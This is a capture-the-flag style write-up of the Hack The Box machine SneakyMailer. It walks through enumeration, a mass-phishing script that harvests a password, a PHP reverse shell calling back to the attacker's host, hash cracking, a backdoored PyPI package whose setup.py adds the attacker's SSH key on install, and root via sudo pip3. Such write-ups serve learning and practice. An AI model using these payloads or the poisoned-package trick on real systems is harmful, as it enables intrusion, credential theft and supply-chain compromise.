Title: HTB SneakyMailer box writeup
Tags: oscp, htb
Summary: Meet the ffuf
Date: 2020-12-21 16:00
Status: published

# Enumeration
The box has some mail services running:
```text
Nmap 7.80 scan initiated Mon Nov 23 11:30:14 2020 as: nmap -sS -p- -v -oA enum/nmap-ss-all 10.10.10.197
Nmap scan report for sneakymailer.htb (10.10.10.197)
Host is up (0.053s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
143/tcp  open  imap
993/tcp  open  imaps
8080/tcp open  http-proxy
Read data files from: /usr/bin/../share/nmap
Nmap done at Mon Nov 23 11:31:30 2020 -- 1 IP address (1 host up) scanned in 75.89 seconds
```
More detailed scripted scan:
```text
Nmap 7.80 scan initiated Mon Nov 23 11:32:09 2020 as: nmap -sC -sV -A -T4 -p21,22,25,80,143,993,8080 -oA enum/nmap-sCVAT4-open 10.10.10.197
Nmap scan report for sneakymailer.htb (10.10.10.197)
Host is up (0.052s latency).
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: completed ACL CAPABILITY IDLE ACL2=UNION STARTTLS OK IMAP4rev1 QUOTA CHILDREN SORT UIDPLUS THREAD=ORDEREDSUBJECT THREAD=REFERENCES UTF8=ACCEPTA0001 ENABLE NAMESPACE
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: completed ACL CAPABILITY IDLE ACL2=UNION OK IMAP4rev1 QUOTA AUTH=PLAIN CHILDREN SORT UIDPLUS THREAD=ORDEREDSUBJECT THREAD=REFERENCES UTF8=ACCEPTA0001 ENABLE NAMESPACE
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   51.07 ms 10.10.14.1
2   51.25 ms sneakymailer.htb (10.10.10.197)
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 23 11:33:12 2020 -- 1 IP address (1 host up) scanned in 64.47 seconds
```
Bunch of services were discovered including notorious vsFTPd (unfortunately this
one is not backdoored), postfix, nginx and courier imapd. No services seems to
be available via UDP, at least top 1000 scan didn't show anything. Nikto results
are also useless, nothing new was found. Gobustered domain webroot:
```text
    kali@kali:~/src/htb/active/SneakyMailer$ gobuster dir -u http://sneakycorp.htb/ -w /usr/share/dirb/wordlists/big.txt -x php,txt,swp -o enum/gob-sneakycorp-root-big-x.txt
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://sneakycorp.htb/
    [+] Threads:        10
    [+] Wordlist:       /usr/share/dirb/wordlists/big.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     php,txt,swp
    [+] Timeout:        10s
    ===============================================================
    2020/11/23 11:37:26 Starting gobuster
    ===============================================================
    /css (Status: 301)
    /img (Status: 301)
    /index.php (Status: 200)
    /js (Status: 301)
    /team.php (Status: 200)
    /vendor (Status: 301)
    ===============================================================
    2020/11/23 11:45:22 Finished
    ===============================================================
```
Gathered information if of no value at a glance. That's interesting is that
there's a suggestion that website has some registration form available
somewhere:

![registration form mentioned](/cstatic/htb-sneakymailer/form-hint.png)

We might have to find this form. Also spotted interesting detail about pip:

![pip avail](/cstatic/htb-sneakymailer/pip-hint.png)

All of them are slight hints about how this box should be owned. I got stuck
there for some time trying to discover where one could register a new account.
Tried usual methods like bustering dirs with different wordlists and finally
got lucky trying to bruteforce `Host` header value using 
[ffuf](https://github.com/ffuf/ffuf):
```text
kali@kali:~/src/htb/active/SneakyMailer$ ~/bintools/ffuf -w ~/src/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://sneakycorp.htb/ -H "Host: FUZZ.sneakycorp.htb" -mc 200        
                                                                                                 
        /'___\  /'___\           /'___\                                                          
       /\ \__/ /\ \__/  __  __  /\ \__/                                                          
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                         
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                         
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                                            
          \/_/    \/_/   \/___/    \/_/                                                                                                                                                            
                                                                                                 
       v1.1.0                                                                                    
________________________________________________                                                                                                                                                   
                                                                                                                                                                                                   
 :: Method           : GET                                                                                                                                                                         
 :: URL              : http://sneakycorp.htb/                                                    
 :: Wordlist         : FUZZ: /home/kali/src/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.sneakycorp.htb 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________ 

dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
:: Progress: [100000/100000] :: Job [1/1] :: 689 req/sec :: Duration: [0:02:25] :: Errors: 0 ::
```
There's a `dev.sneakycorp.htb` virtual host with registration form available at
`http://dev.sneakycorp.htb/pypi/register.php`. There was a place for another
couple of head-scratching moments. Sometimes looking carefully at the box page
in HTB will provide some hints, it was exact this situation. Box icon shows us
the fisherman and it looks like there should be a place for some sort of
phishing attack. Since we've got a list of employees with their emails, we
can now easily register our own user and try to send some dogdy mails to all of
them. Composed a little script to accomplish that:
```bash
#!/bin/bash
echo "[+] Sending to $1"
curl --url 'smtp://10.10.10.197:25' \
  --mail-from 'poc@sneakymailer.htb' \
  --mail-rcpt "$1" \
  --user 'poc@sneakymailer.htb:123' \
-T <(echo -e 'From: poc@sneakymailer.htb\nTo: ' $1 '\nSubject: Click that\n\nhttp://10.10.14.17:8000')
```
And just invoked it for all the addresses in the employee list, just like that: 
`while read -r line; do ./send-email.sh $line; done < ../enum/email-names.txt`

After a while webserver showed up some juicy info:
```text
kali@kali:~/src/htb/active/SneakyMailer$ nc -nlvp 8000
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:42266.
POST / HTTP/1.1
Host: 10.10.14.17:8000
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded
firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```
This request looks like being designated to account registration form mentioned
earlier. Decoded credentials (which are quite secure) allows to read email in
Paul Byrd's mailbox, here's short info extracted from there:
```text
a002 fetch 1 body[TEXT]                                                                          
* 1 FETCH (BODY[TEXT] {1888}
--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset="utf-8"
Hello administrator, I want to change this password for the developer accou=
nt                                     
Username: developer                     
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
…
a002 fetch 2 body[text]
* 2 FETCH (BODY[TEXT] {166}
Hello low
Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.
```
It could be retrieved manually from imap service using nc, ncat or openssl and
imap commands.

# Exploitation
In the meanwhile I vainly tried to bruteforce FTP using names from the mail list 
and `probable-v2-top207.txt` from SecLists, no luck here. Turned out that creds
acquired from Paul's mailbox work for FTP access and FTP root also maps to
webroot of `dev.sneakycorp.htb`. Uploaded a trivial shell there:
```php
<?php
    exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.17/53 0>&1'");
?>
```
`www-data` is the initial user for spawned shell, but could be changed to
`developer` using `su` and FTP password:
```text
developer@sneakymailer:~$ whoami && id && hostname && ip a
developer
uid=1001(developer) gid=1001(developer) groups=1001(developer)
sneakymailer
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:05:53 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.197/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:553/64 scope global dynamic mngtmpaddr 
       valid_lft 85851sec preferred_lft 13851sec
    inet6 fe80::250:56ff:feb9:553/64 scope link 
   valid_lft forever preferred_lft forever
```
Linpeas.sh highlighted some interesting htpasswd file:
```text
Reading /var/www/pypi.sneakycorp.htb/.htpasswd
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```
Was easily cracked with rockyou wordlist:
```text
kali@kali:~/src/htb/active/SneakyMailer$ hashcat -m 1600 -a 0 --force '$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/' /usr/share/wordlists/rockyou.txt 
…
$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
Time.Started.....: Mon Nov 23 19:21:06 2020 (5 mins, 37 secs)
Time.Estimated...: Mon Nov 23 19:26:43 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10735 H/s (11.45ms) @ Accel:256 Loops:125 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 3614720/14344385 (25.20%)
Rejected.........: 0/3614720 (0.00%)
Restore.Point....: 3613696/14344385 (25.19%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
Candidates.#1....: soul706 -> sotoba6
Started: Mon Nov 23 19:20:41 2020
Stopped: Mon Nov 23 19:26:44 2020
```
It turned out that there's another virtual host that used as a pypi repository. 
Excerpt from `/etc/nginx/sites-available/pypi.sneakycorp.htb`:
```nginx
developer@sneakymailer:/var$ cat /etc/nginx/sites-available/pypi.sneakycorp.htb 
server {
        listen 0.0.0.0:8080 default_server;
        listen [::]:8080 default_server;
        server_name _;
}


server {
        listen 0.0.0.0:8080;
        listen [::]:8080;

        server_name pypi.sneakycorp.htb;

        location / {
                proxy_pass http://127.0.0.1:5000;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
        }
}
```
After a lot of tries and local tests I was able to bundle package that will let
me in. Do you remember that low is supposed to install and check all the 
packages from local pypi? The package was made as follows. First create a 
`setup.py`:
```python
import setuptools


try:
    with open("/home/low/.ssh/authorized_keys", "a") as keys:
        keys.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJQBL1DIJB0EnGZCZ2N1x4bzE5c3g1mmPIsW//CIRVngpvL3xYnhImNEA34uLIvXdyKdK/X9pFymX/xXricUlDjxSAXLZW805K2ZiaxazM5R4R6l+Rwnbg4pTfOBWR40XNP4H+jgncchomSy1vlG5E7TM+LanfauZpGXydnGnAg++dyMdSSKu1VQ2jU1d8KDfeIY9KD7qCvJKWg1QNOfKAmXzUGw29ZwnyE1T572dHsxxw6JLDYjvC2md8L/zbONJzPAsKfZltcxROgg3CPdRSJxYvOL0POOijOD+CBTu1z6MxXZ6CoKMV/IReb/w6zWZ6Pi2AzBNNLBA851kPFK+4EoS51vjtAzgSKLIrORyCWZEEVB+FybMeFNdWG9C0DlS2ODDGbqKrrxGHQNIeUWQ8g3fvk797EwuU1124Bjo7L3u3D655BpXZoElwNiooc3a2l5wwqtjetias4ygvSoBQ5/XmboTaqkkvscx4kAjRPjAM5O2edaFEHt6pv3P/fxc= kali@kali")
except:
    pass

setuptools.setup(
    name="shellback",
    version="0.0.1",
    author="Bad Samaritan",
    author_email="paulbyrd@sneakymailer.htb",
    description="A small example package",
    long_description="lawl",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)
```
Then bundle it with `python3 setup.py sdist bdist_wheel` and push to remote pypi
using cracked creds when prompted:
`python3 -m twine upload --repository-url http://pypi.sneakycorp.htb:8080 dist/*`.
After a while we can connect as low and finally have the user shell:
```text
low@sneakymailer:~$ whoami && id && hostname && ip a && cat user.txt 
low
uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)
sneakymailer
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:05:53 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.197/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:553/64 scope global dynamic mngtmpaddr 
       valid_lft 86012sec preferred_lft 14012sec
    inet6 fe80::250:56ff:feb9:553/64 scope link 
       valid_lft forever preferred_lft forever
58b7408afb<SNIP>
```
# Privilege escalation
Getting the user is the toughest part of this box. Privilege escalation is
trivial and gets couple of seconds. `low` can use `sudo`:
```text
low@sneakymailer:~$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User low may run the following commands on sneakymailer:
(root) NOPASSWD: /usr/bin/pip3
```
According to GTFOBins [pip](https://gtfobins.github.io/gtfobins/pip/#shell) 
may be used to spawn the shell. And this method indeed works flawlessly, we just
experience a little lag because some hostname fails to resolve by the `sudo`:
```text
low@sneakymailer:/dev/shm$ TF=$(mktemp -d)
low@sneakymailer:/dev/shm$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
low@sneakymailer:/dev/shm$ sudo pip3 install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.qOa2igmw5e
# /bin/bash
root@sneakymailer:/tmp/pip-req-build-_gihxdwv# whoami && id && hostname && ip a && cat /root/root.txt
root
uid=0(root) gid=0(root) groups=0(root)
sneakymailer
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:05:53 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.197/24 brd 10.10.10.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:553/64 scope global dynamic mngtmpaddr 
       valid_lft 85992sec preferred_lft 13992sec
    inet6 fe80::250:56ff:feb9:553/64 scope link 
       valid_lft forever preferred_lft forever
3ff740e5d<SNIP>
```
